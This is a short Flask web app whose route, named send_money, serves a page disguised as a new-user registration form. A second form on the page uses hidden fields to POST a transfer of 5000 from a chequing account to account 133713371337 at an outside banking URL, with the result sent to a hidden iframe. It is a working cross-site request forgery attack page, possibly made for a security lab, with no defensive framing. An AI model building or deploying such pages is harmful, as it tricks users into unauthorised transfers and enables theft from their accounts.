from flask import Flask

from flask import Flask
app = Flask(__name__)


@app.route('/')
def send_money():
    return """
    <form>
    <h1>New User Registration</h1>
 <label for="fname">First name:</label><br>
  <input type="text" id="fname" name="fname"><br>
  <label for="lname">Last name:</label><br>
  <input type="text" id="lname" name="lname">
  </form>
<form action='https://popeax.ca/transferMoney' method='POST' target='dummyframe'>
    <input type="hidden" id="srcAcct" name="srcAcct" value="chequing">
    <input type="hidden" id="destAcct" name="destAcct" value="133713371337">
    <input type="hidden" id="amount" name="amount" value="5000">
     <input type="submit" value="submit">
</form>

<iframe name="dummyframe" id="dummyframe" style="display: none;"></iframe>
"""


